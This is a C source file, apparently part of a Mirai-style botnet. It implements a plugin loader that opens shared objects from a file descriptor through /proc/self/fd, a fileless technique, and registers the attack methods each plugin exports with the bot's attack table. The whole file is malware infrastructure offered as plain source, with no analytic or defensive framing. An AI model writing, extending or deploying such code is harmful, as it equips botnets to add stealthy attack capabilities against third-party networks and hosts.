#define _GNU_SOURCE
#include "module.h"
#include "attack.h"
#include "util.h"
#include <dlfcn.h>
#include <unistd.h>

#define MODULES_MAX 8

struct module_entry {
    char name[MODULE_NAME_MAX];
    void *handle;
};

static struct module_entry modules[MODULES_MAX];
static int module_count = 0;

typedef void (*module_init_t)(void (*)(uint8_t, ATTACK_FUNC, const char *));

static void register_method(uint8_t vector, ATTACK_FUNC func, const char *name)
{
    add_attack(vector, func);
}

int module_load_fd(int fd, const char *name)
{
    if (module_count >= MODULES_MAX || fd < 0)
        return -1;

    lseek(fd, 0, SEEK_SET);

    // dlopen from /proc/self/fd/N
    char proc_path[64];
    int plen = util_strlen("/proc/self/fd/");
    util_memcpy(proc_path, "/proc/self/fd/", plen);
    int n = fd;
    int digits = 0, tmp = n;
    do { tmp /= 10; digits++; } while (tmp > 0);
    int i = digits;
    proc_path[plen + i] = '\0';
    do {
        i--;
        proc_path[plen + i] = '0' + (n % 10);
        n /= 10;
    } while (n > 0);

    void *handle = dlopen(proc_path, RTLD_NOW | RTLD_LOCAL);
    if (!handle)
        return -1;

    module_init_t init = (module_init_t)dlsym(handle, "module_init");
    if (!init) {
        dlclose(handle);
        return -1;
    }

    struct module_entry *mod = &modules[module_count++];
    util_strcpy(mod->name, name);
    mod->handle = handle;

    init(register_method);

    return 0;
}

void module_unload(const char *name)
{
    for (int i = 0; i < module_count; i++) {
        if (util_strcmp(modules[i].name, name)) {
            dlclose(modules[i].handle);
            for (int j = i; j < module_count - 1; j++)
                modules[j] = modules[j + 1];
            module_count--;
            break;
        }
    }
}

void module_unload_all(void)
{
    while (module_count > 0) {
        module_count--;
        dlclose(modules[module_count].handle);
    }
}
